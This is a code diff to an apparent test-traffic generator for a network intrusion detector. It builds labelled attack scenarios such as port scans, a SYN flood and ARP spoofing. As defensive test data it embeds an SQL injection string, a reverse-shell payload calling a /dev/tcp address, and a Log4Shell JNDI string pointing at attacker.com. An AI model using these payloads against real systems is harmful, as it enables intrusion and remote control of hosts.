@@ -54,12 +54,24 @@ BASE_TIME = 1_700_000_000.0  # 2023-11-14 22:13:20 UTC
 SCENARIOS: list[dict] = []
 
 
-def scenario(sid: str, rule: str, description: str):
+def scenario(
+    sid: str,
+    rule: str,
+    description: str,
+    src_ip: str = "",
+    dst_ip: str = "",
+    dst_port: str = "",
+    protocol: str = "",
+):
     """Register a scenario in the manifest."""
     SCENARIOS.append({
-        "scenario_id": sid,
+        "scenario_id":  sid,
         "expected_rule": rule,
-        "description": description,
+        "src_ip":       src_ip,
+        "dst_ip":       dst_ip,
+        "dst_port":     dst_port,
+        "protocol":     protocol,
+        "description":  description,
     })
 
 
@@ -73,7 +85,12 @@ def _make_eth(src_mac="aa:bb:cc:11:22:33", dst_mac="00:11:22:33:44:55"):
 
 def gen_blocklist_hit(base: float) -> list:
     """S01: A host contacts a known-malicious IP → should fire BLOCKLIST."""
-    scenario("S01", "BLOCKLIST", "Host contacts known-malicious IP")
+    scenario(
+        "S01", "BLOCKLIST",
+        "Host contacts known-malicious IP",
+        src_ip="192.168.1.55", dst_ip=TEST_MALICIOUS_IP,
+        dst_port="443", protocol="TCP",
+    )
     pkt = (_make_eth("aa:bb:cc:55:55:55") /
            IP(src="192.168.1.55", dst=TEST_MALICIOUS_IP) /
            TCP(sport=43210, dport=443, flags="S"))
@@ -83,7 +100,12 @@ def gen_blocklist_hit(base: float) -> list:
 
 def gen_vertical_port_scan(base: float) -> list:
     """S02: One src probes 20 distinct ports on one host → VERTICAL PORT_SCAN."""
-    scenario("S02", "PORT_SCAN", "Vertical port scan: one src, many ports, one target")
+    scenario(
+        "S02", "PORT_SCAN",
+        "Vertical port scan: one src, many ports, one target",
+        src_ip="192.168.1.105", dst_ip="192.168.1.1",
+        protocol="TCP",
+    )
     pkts = []
     for i, port in enumerate(range(20, 40)):
         pkt = (_make_eth("de:ad:be:ef:01:05") /
@@ -96,7 +118,11 @@ def gen_vertical_port_scan(base: float) -> list:
 
 def gen_horizontal_port_scan(base: float) -> list:
     """S03: One src probes port 22 across 20 different hosts → HORIZONTAL PORT_SCAN."""
-    scenario("S03", "PORT_SCAN", "Horizontal port scan: one src, one port, many hosts")
+    scenario(
+        "S03", "PORT_SCAN",
+        "Horizontal port scan: one src, one port, many hosts",
+        src_ip="10.0.0.50", dst_port="22", protocol="TCP",
+    )
     pkts = []
     for i in range(20):
         pkt = (_make_eth("de:ad:be:ef:01:06") /
@@ -109,7 +135,12 @@ def gen_horizontal_port_scan(base: float) -> list:
 
 def gen_syn_flood(base: float) -> list:
     """S04: 120 SYN packets to port 80 in rapid succession → SYN_FLOOD."""
-    scenario("S04", "SYN_FLOOD", "SYN burst: 120 SYNs to port 80 in <10s")
+    scenario(
+        "S04", "SYN_FLOOD",
+        "SYN burst: 120 SYNs to port 80 in <10s",
+        src_ip="192.168.1.200", dst_ip="192.168.1.1",
+        dst_port="80", protocol="TCP",
+    )
     pkts = []
     for seq in range(120):
         pkt = (_make_eth("de:ad:be:ef:02:00") /
@@ -122,7 +153,11 @@ def gen_syn_flood(base: float) -> list:
 
 def gen_arp_spoof(base: float) -> list:
     """S05: First legitimate ARP mapping, then forged claim → ARP_SPOOF."""
-    scenario("S05", "ARP_SPOOF", "ARP identity change: gateway MAC changes")
+    scenario(
+        "S05", "ARP_SPOOF",
+        "ARP identity change: gateway MAC changes",
+        src_ip="192.168.1.1", protocol="ARP",
+    )
     # Normal gateway ARP announcement
     normal_arp = (_make_eth("00:11:22:33:44:01", "ff:ff:ff:ff:ff:ff") /
                   ARP(op="is-at", psrc="192.168.1.1",
@@ -139,7 +174,12 @@ def gen_arp_spoof(base: float) -> list:
 
 def gen_sql_injection(base: float) -> list:
     """S06: HTTP payload containing SQLi pattern → PAYLOAD_HIT / SQL_INJECTION."""
-    scenario("S06", "PAYLOAD_HIT", "SQLi pattern in HTTP request body")
+    scenario(
+        "S06", "PAYLOAD_HIT",
+        "SQLi pattern in HTTP request body",
+        src_ip="192.168.1.77", dst_ip="192.168.1.1",
+        dst_port="80", protocol="TCP",
+    )
     payload = b"POST /login HTTP/1.1\r\nHost: target\r\n\r\nuser=admin' OR 1=1--"
     pkt = (_make_eth() /
            IP(src="192.168.1.77", dst="192.168.1.1") /
@@ -151,7 +191,12 @@ def gen_sql_injection(base: float) -> list:
 
 def gen_cmd_injection(base: float) -> list:
     """S07: HTTP payload containing reverse-shell pattern → PAYLOAD_HIT / CMD_INJECTION."""
-    scenario("S07", "PAYLOAD_HIT", "CMD_INJECTION / reverse shell in HTTP payload")
+    scenario(
+        "S07", "PAYLOAD_HIT",
+        "CMD_INJECTION / reverse shell in HTTP payload",
+        src_ip="192.168.1.78", dst_ip="192.168.1.1",
+        dst_port="80", protocol="TCP",
+    )
     payload = b"GET /?cmd=bash+-i+>%26+/dev/tcp/10.0.0.99/4444+0>%261 HTTP/1.1\r\n"
     pkt = (_make_eth() /
            IP(src="192.168.1.78", dst="192.168.1.1") /
@@ -163,7 +208,12 @@ def gen_cmd_injection(base: float) -> list:
 
 def gen_log4shell(base: float) -> list:
     """S08: HTTP payload containing Log4Shell JNDI pattern → PAYLOAD_HIT / LOG4SHELL."""
-    scenario("S08", "PAYLOAD_HIT", "Log4Shell JNDI injection in User-Agent")
+    scenario(
+        "S08", "PAYLOAD_HIT",
+        "Log4Shell JNDI injection in User-Agent",
+        src_ip="192.168.1.79", dst_ip="192.168.1.1",
+        dst_port="8080", protocol="TCP",
+    )
     payload = (b"GET / HTTP/1.1\r\n"
                b"User-Agent: ${jndi:ldap://attacker.com/exploit}\r\n\r\n")
     pkt = (_make_eth() /
@@ -176,7 +226,12 @@ def gen_log4shell(base: float) -> list:
 
 def gen_credential_leak(base: float) -> list:
     """S09: HTTP payload leaking plaintext password → PAYLOAD_HIT / CREDENTIAL_LEAK."""
-    scenario("S09", "PAYLOAD_HIT", "Plaintext password= in HTTP POST body")
+    scenario(
+        "S09", "PAYLOAD_HIT",
+        "Plaintext password= in HTTP POST body",
+        src_ip="192.168.1.80", dst_ip="192.168.1.1",
+        dst_port="80", protocol="TCP",
+    )
     payload = b"POST /auth HTTP/1.1\r\n\r\nusername=alice&password=s3cr3t123"
     pkt = (_make_eth() /
            IP(src="192.168.1.80", dst="192.168.1.1") /
@@ -188,8 +243,12 @@ def gen_credential_leak(base: float) -> list:
 
 def gen_dns_dga(base: float) -> list:
     """S10: High-entropy DNS query (DGA-like) → DNS_ANOMALY."""
-    scenario("S10", "DNS_ANOMALY", "High-entropy DGA-like DNS query")
-    # 'xvqrztmplwbsnfhk' — all consonants, high entropy, len >= 8
+    scenario(
+        "S10", "DNS_ANOMALY",
+        "High-entropy DGA-like DNS query",
+        src_ip="192.168.1.88", dst_ip="8.8.8.8",
+        dst_port="53", protocol="UDP",
+    )
     dga_label = "xvqrztmplwbsnfhk"
     pkt = (_make_eth() /
            IP(src="192.168.1.88", dst="8.8.8.8") /
@@ -201,8 +260,12 @@ def gen_dns_dga(base: float) -> list:
 
 def gen_dns_long(base: float) -> list:
     """S11: Very long DNS query (tunnelling-like) → DNS_ANOMALY."""
-    scenario("S11", "DNS_ANOMALY", "Unusually long DNS query (>60 chars)")
-    # 64-char label — common in DNS tunnelling (e.g. iodine, dnscat2)
+    scenario(
+        "S11", "DNS_ANOMALY",
+        "Unusually long DNS query (>60 chars)",
+        src_ip="192.168.1.89", dst_ip="8.8.8.8",
+        dst_port="53", protocol="UDP",
+    )
     long_label = "a" * 63
     pkt = (_make_eth() /
            IP(src="192.168.1.89", dst="8.8.8.8") /
@@ -308,6 +371,9 @@ def gen_benign_syn_below_threshold(base: float) -> list:
 def generate_all():
     base = BASE_TIME
 
+    # Clear manifest so repeated calls in the same process don't accumulate
+    SCENARIOS.clear()
+
     print("[*] Generating ATTACK scenarios ...")
     attack_pkts = []
     attack_pkts += gen_blocklist_hit(base)
@@ -344,12 +410,16 @@ def generate_all():
         f.write(f"{TEST_MALICIOUS_IP}\n")
     print(f"  [✔] Test blocklist → {TEST_BLOCKLIST}")
 
-    # Write labelled scenario CSV
+    # Write labelled scenario CSV with full endpoint fields (P0)
     os.makedirs(os.path.dirname(LABELS_CSV), exist_ok=True)
     with open(LABELS_CSV, "w", newline="") as f:
         writer = csv.DictWriter(
             f,
-            fieldnames=["scenario_id", "expected_rule", "description"],
+            fieldnames=[
+                "scenario_id", "expected_rule",
+                "src_ip", "dst_ip", "dst_port", "protocol",
+                "description",
+            ],
         )
         writer.writeheader()
         writer.writerows(SCENARIOS)
@@ -361,11 +431,26 @@ def generate_all():
     print(f"    Test blocklist:{TEST_BLOCKLIST}")
     print(f"    Labels CSV:    {LABELS_CSV}")
     print()
-    print("[*] To replay through the engine:")
-    print(f"    python evaluation/replay.py {OUTPUT_ATTACK} --blocklist {TEST_BLOCKLIST}")
+    print("[*] To replay + evaluate (copy-paste ready, uses isolated state):")
+    print(f"    # 1. Replay attack PCAP into isolated DB:")
+    print(f"    python evaluation/replay.py \\")
+    print(f"      --pcap {OUTPUT_ATTACK} \\")
+    print(f"      --blocklist {TEST_BLOCKLIST} \\")
+    print(f"      --db /tmp/netguard-eval.db \\")
+    print(f"      --arp-table /tmp/netguard-eval-arp.json")
     print()
-    print("[*] To evaluate against ground-truth labels:")
-    print(f"    python evaluation/compare.py --mode ground-truth --labels {LABELS_CSV}")
+    print(f"    # 2. Run ground-truth evaluation against the SAME isolated DB:")
+    print(f"    python evaluation/compare.py \\")
+    print(f"      --mode ground-truth \\")
+    print(f"      --labels {LABELS_CSV} \\")
+    print(f"      --db /tmp/netguard-eval.db")
+    print()
+    print(f"    # 3. Replay benign PCAP (fresh ARP table) — expect zero alerts:")
+    print(f"    python evaluation/replay.py \\")
+    print(f"      --pcap {OUTPUT_BENIGN} \\")
+    print(f"      --blocklist {TEST_BLOCKLIST} \\")
+    print(f"      --db /tmp/netguard-benign.db \\")
+    print(f"      --arp-table /tmp/netguard-benign-arp.json")
 
 
 if __name__ == "__main__":
